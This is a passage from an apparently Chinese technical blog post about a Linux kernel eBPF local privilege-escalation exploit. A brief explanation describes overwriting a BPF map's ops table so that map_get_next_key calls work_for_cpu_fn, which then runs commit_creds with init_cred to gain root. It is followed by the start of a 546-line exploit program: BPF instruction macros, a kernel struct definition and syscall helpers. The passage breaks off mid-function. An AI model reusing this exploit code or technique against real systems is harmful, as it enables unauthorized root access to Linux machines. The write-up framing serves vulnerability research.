class="line"><span class="keyword">goto</span> free_next_key;</span><br><span class="line"></span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">free_next_key:</span><br><span class="line">kvfree(next_key);</span><br><span class="line">free_key:</span><br><span class="line">kvfree(key);</span><br><span class="line">err_put:</span><br><span class="line">fdput(f);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里选择这个函数的很明显，在中途直接调用了ops中的<code>map_get_next_key</code>，并且第一个参数为map。那么这个时候我们如果修改ops为我们的<code>bpf-&gt;value</code>即可调用到<code>work_for_cpu_fn</code>，那么在根据<code>work_for_cpu_fn</code>函数内部调整<code>commit_creds</code>和<code>init_cred</code>即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf_common.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _BPF_DEFS_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _BPF_DEFS_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                        \</span></span><br><span class="line"><span class="meta">        .code = CODE,                          \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                        \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                        \</span></span><br><span class="line"><span class="meta">        .off = OFF,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64_RAW(DST, SRC, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                              \</span></span><br><span class="line"><span class="meta">        .code = BPF_LD | BPF_DW | BPF_IMM,           \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                              \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                              \</span></span><br><span class="line"><span class="meta">        .off = 0,                                    \</span></span><br><span class="line"><span class="meta">        .imm = (__u32)(IMM)&#125;),                       \</span></span><br><span class="line"><span class="meta">        ((struct bpf_insn)&#123;                          \</span></span><br><span class="line"><span class="meta">            .code = 0, <span class="comment">/* zero is reserved opcode */</span> \</span></span><br><span class="line"><span class="meta">            .dst_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .src_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .off = 0,                                \</span></span><br><span class="line"><span class="meta">            .imm = ((__u64)(IMM)) &gt;&gt; 32&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory load, dst_reg = *(uint *) (src_reg + off16) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory store, *(uint *) (dst_reg + off16) = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_STX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conditional jumps against immediates, if (dst_reg &#x27;op&#x27; imm32) goto pc + off16 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                       \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                       \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                         \</span></span><br><span class="line"><span class="meta">        .off = OFF,                           \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP32_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP32 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = OFF,                             \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_IMM(DST, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                        \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_IMM(DST, IMM)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_REG(DST, SRC)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_REG(DST, SRC)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                    \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_IMM(OP, DST, IMM)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_REG(OP, DST, SRC)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                         \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Program exit */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_EXIT_INSN()             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;             \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_EXIT, \</span></span><br><span class="line"><span class="meta">        .dst_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .off = 0,                   \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* BPF_LD_IMM64 macro encodes single &#x27;load 64-bit immediate&#x27; insn */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64(DST, IMM) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_MAP_FD(DST, MAP_FD) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// varies from userspace bpf_map_info definition so need to redefine</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info_kernel</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __u32 type;</span><br><span class="line">    __u32 id;</span><br><span class="line">    __u32 key_size;</span><br><span class="line">    __u32 value_size;</span><br><span class="line">    __u32 max_entries;</span><br><span class="line">    __u32 map_flags;</span><br><span class="line">    <span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">    __u32 ifindex;</span><br><span class="line">    __u32 btf_vmlinux_value_type_id;</span><br><span class="line">    __u64 netns_dev;</span><br><span class="line">    __u64 netns_ino;</span><br><span class="line">    __u32 btf_id;</span><br><span class="line">    __u32 btf_key_type_id;</span><br><span class="line">    __u32 btf_value_type_id;</span><br><span class="line">&#125; __attribute__((aligned(<span class="number">8</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, cmd, attrs, <span class="keyword">sizeof</span>(*attrs));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *map_attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_CREATE, map_attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">update_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value, <span class="keyword">uint64_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    attr.flags = flags;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lookup_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">obj_get_info_by_fd</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> 